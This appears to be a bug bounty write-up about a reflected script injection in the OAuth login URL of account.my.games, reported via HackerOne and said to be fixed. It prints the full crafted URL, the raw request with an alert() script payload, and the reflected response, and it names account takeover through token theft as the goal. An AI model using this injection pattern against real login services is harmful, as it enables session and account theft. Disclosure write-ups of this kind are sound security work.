# Target
Target is https://lootdog.io/ from mailru which had a large scope on HackerOne. After an hour of recon, I found an unintended behavior in the Oauth request so I decided to play around.

## Technical Analysis
I intercepted the login request from https://lootdog.io/ and sent it to the repeater and observed the way the Oauth works. The https://lootdog.io/ uses https://account.my.games as an Oauth service when you click login it will redirect you to https://account.my.games and will let you log in if you have a legitimate account. So I decided to check for Reflected XSS or any Open redirect issues to grab the Oauth token to take Over the user's account.

I added an extra parameter at the end of the keyed value on the request as below,

`&Set-Cookie: <script>alert(“Hacked By Deathstroke”)</script>`

The finally crafted URL will be like as below,

```
https://account.my.games//oauth2/login/?continue=https%3A%2F%2Faccount.my.games%2Foauth2%2F%3Fredirect_uri%3Dhttps%253A%252F%252Flootdog.io%252Fsocial%252Fcomplete%252Fo2mygames%252F%26client_id%3Dlootdog_io%26response_type%3Dcode%26signup_social%3Dmailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw%26signup_method%3Demail%252Cphone%26lang%3DEN&client_id=lootdog_io&lang=EN&signup_method=email%2Cphone&signup_social=mailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw&Set-Cookie: <script>alert("Hacked By Deathstroke")</script>
```

After inserted the payload at the end of the URL sent the request as below and observed the response.

## Request

```http
GET /oauth2/login/?continue=https%3A%2F%2Faccount.my.games%2Foauth2%2F%3Fredirect_uri%3Dhttps%253A%252F%252Flootdog.io%252Fsocial%252Fcomplete%252Fo2mygames%252F%26client_id%3Dlootdog_io%26response_type%3Dcode%26signup_social%3Dmailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw%26signup_method%3Demail%252Cphone%26lang%3DEN&client_id=lootdog_io&lang=EN&signup_method=email%2Cphone&signup_social=mailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw&Set-Cookie: <script>alert("Hacked By Deathstroke")</script> HTTP/1.1 
Host: account.my.games 
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0

Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate

```

## Response

```http
<script>alert("Hacked By Deathstroke")</script> HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 
X-Frame-Options: SAMEORIGIN 
Content-Length: 3982 
Vary: Origin
```

But unfortunately, no access token is reflected on the response at the time. But I reported to the program because the issue may cause some other security threats.

Seems that the payload worked which is reflected on the HTTP response.

It was my first Vulnerability that I found, so I quickly created a report and sent it to HackerOne. The HackerOne analyst verified the vulnerability and triaged the report after some discussions and the issue was resolved and they rewarded me a HOF.

Thank you for reading.
